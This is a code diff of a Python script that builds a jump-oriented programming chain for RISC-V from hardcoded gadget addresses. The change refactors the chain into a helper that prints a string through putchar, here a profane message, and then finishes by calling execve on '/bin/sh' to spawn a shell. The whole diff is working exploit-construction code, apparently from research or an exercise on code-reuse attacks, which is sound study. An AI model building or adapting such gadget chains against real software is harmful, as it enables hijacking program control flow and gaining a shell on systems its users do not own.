@@ -58,6 +58,20 @@ class dispatchBuf():
     def __str__(self):
         return '\n'.join([format(h, 'x') for h in self.buf]) + '\n'
 
+def print_string(string, bufs):
+    for c in string:
+        buf = dispatchBuf(bufs[-1])
+        # Jump to gadget which sets the next dispatcher buf
+        buf.set_t1(set_t0_s3_jump_a3)
+        # Then jump to putchar
+        buf.set_a3(putchar)
+        buf.set_a0(ord(c))
+        # Return to dispatcher gadget after putchar finishes
+        buf.set_ra(load_from_t0)
+        # Set the stack to the second buf ptr as this shouldn't be used anymore
+        buf.set_sp(bufs[-1].dispatch_buf)
+        bufs.append(buf)
+
 # Pointer values
 load_from_t0 = 0x20000648da
 set_t0_s3_jump_a3 = 0x200007be24
@@ -81,29 +95,19 @@ buf2 = dispatchBuf(buf1)
 buf2.set_t1(set_t0_s3_jump_a3)
 buf2.set_a3(load_from_t0)
 
-# This buffer jumps to jalr a5 which then goes to putchar
-buf3 = dispatchBuf(buf2)
-# Jump to gadget which sets the next dispatcher buf
-buf3.set_t1(set_t0_s3_jump_a3)
-# Then jump to putchar
-buf3.set_a3(putchar)
-buf3.set_a0(ord('c'))
-# Return to dispatcher gadget after putchar finishes
-buf3.set_ra(load_from_t0)
-# Set the stack to the second buf ptr as this shouldn't be used anymore
-buf3.set_sp(buf2.dispatch_buf)
+bufs = [buf1, buf2]
 
+print_string('fuck risc-v\n', bufs)
 # This buffer jumps to execve and executes "/bin/sh"
-buf4 = dispatchBuf(buf3)
-buf4.set_a0(bin_sh_str)
-buf4.set_a1(0)
-buf4.set_a2(0)
-buf4.set_t1(execve)
+final_buf = dispatchBuf(bufs[-1])
+final_buf.set_a0(bin_sh_str)
+final_buf.set_a1(0)
+final_buf.set_a2(0)
+final_buf.set_t1(execve)
+bufs.append(final_buf)
 
-dispatch_file.write(str(buf1))
-dispatch_file.write(str(buf2))
-dispatch_file.write(str(buf3))
-dispatch_file.write(str(buf4))
+for buf in bufs:
+    dispatch_file.write(str(buf))
 # dispatch_file.write(str(buf5))
 
 dispatch_file.close()
